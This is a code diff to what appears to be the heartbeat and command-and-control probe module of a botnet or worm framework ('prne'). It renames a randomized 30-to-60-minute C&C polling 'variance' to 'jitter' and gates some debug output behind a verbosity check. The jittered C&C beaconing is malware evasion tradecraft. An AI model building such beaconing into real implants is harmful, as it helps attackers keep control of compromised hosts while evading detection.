@@ -22,10 +22,10 @@
 
 // Hover Max Redirection count
 #define HTBT_HOVER_MAX_REDIR	5
-// CNCP interval: HTBT_CNCP_INT_MIN + variance
+// CNCP interval: HTBT_CNCP_INT_MIN + jitter
 // between 30 minutes and an hour
 #define HTBT_CNCP_INT_MIN	1800000 // half an hour minimum interval
-#define HTBT_CNCP_INT_VAR	1800000 // half an hour variance
+#define HTBT_CNCP_INT_JIT	1800000 // half an hour jitter
 #define HTBT_LBD_PORT			prne_htobe16(PRNE_HTBT_PROTO_PORT)
 #define HTBT_LBD_BACKLOG		4
 #define HTBT_LBD_MAX_CLIENTS	5
@@ -855,7 +855,7 @@ static void htbt_slv_consume_outbuf (
 					}
 					prne_dbgpf("\n");
 				}
-				else {
+				else if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
 					prne_dbgpf(
 						HTBT_NT_SLV"@%"PRIuPTR": > %d bytes.\n",
 						(uintptr_t)ctx,
@@ -1560,7 +1560,7 @@ static void *htbt_slv_entry (void *p) {
 						}
 						prne_dbgpf("\n");
 					}
-					else {
+					else if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
 						prne_dbgpf(
 							HTBT_NT_SLV"@%"PRIuPTR": < %d bytes.\n",
 							(uintptr_t)ctx,
@@ -2182,7 +2182,7 @@ static void htbt_cncp_stream_slv (
 					}
 					prne_dbgpf("\n");
 				}
-				else {
+				else if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
 					prne_dbgpf(
 						HTBT_NT_CNCP"@%"PRIuPTR": < %zu bytes.\n",
 						(uintptr_t)ctx,
@@ -2359,13 +2359,13 @@ static void *htbt_cncp_entry (void *p) {
 	while (ctx->loop_flag) {
 		htbt_cncp_do_probe(ctx);
 
-		// calc interval variance
+		// calc interval jitter
 		intvar = 0; // ignore failure of mbedtls_ctr_drbg_random()
 		mbedtls_ctr_drbg_random(
 			ctx->param.ctr_drbg,
 			(unsigned char*)&intvar,
 			sizeof(intvar));
-		intvar = HTBT_CNCP_INT_MIN + (intvar % HTBT_CNCP_INT_VAR);
+		intvar = HTBT_CNCP_INT_MIN + (intvar % HTBT_CNCP_INT_JIT);
 		pth_event_free(ev, FALSE);
 		ev = pth_event(
 			PTH_EVENT_TIME,
